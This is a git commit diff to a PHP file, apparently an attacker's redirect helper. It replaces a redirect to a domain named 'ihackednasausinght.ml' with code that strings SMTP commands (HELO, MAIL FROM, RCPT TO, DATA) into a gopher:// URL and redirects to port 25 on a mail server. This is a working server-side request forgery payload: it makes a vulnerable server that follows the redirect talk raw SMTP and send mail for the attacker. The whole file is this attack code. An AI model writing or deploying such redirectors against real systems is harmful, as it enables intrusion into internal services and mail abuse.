bd2fc76172c6eb60ed0a9f06317d10a0d35647c4
anishacks <66885893+anishacks@users.noreply.github.com>
2021-03-31 18:51:48 +0530

    Update test.php

--- test.php
+++ test.php
@@ -1,3 +1,14 @@
 <?php
-    header('Location: https://redir.ihackednasausinght.ml');
+        $commands = array(
+                'HELO test.org',
+                'MAIL FROM: <aaaaaaaaaaa@tester.com>',
+                'RCPT TO: <anishacks@gmail.com>',
+                'DATA',
+                'Test mail',
+                '.'
+        );
+
+        $payload = implode('%0A', $commands);
+
+        header('Location: gopher://test.smtp.org:25/_'.$payload);
 ?>
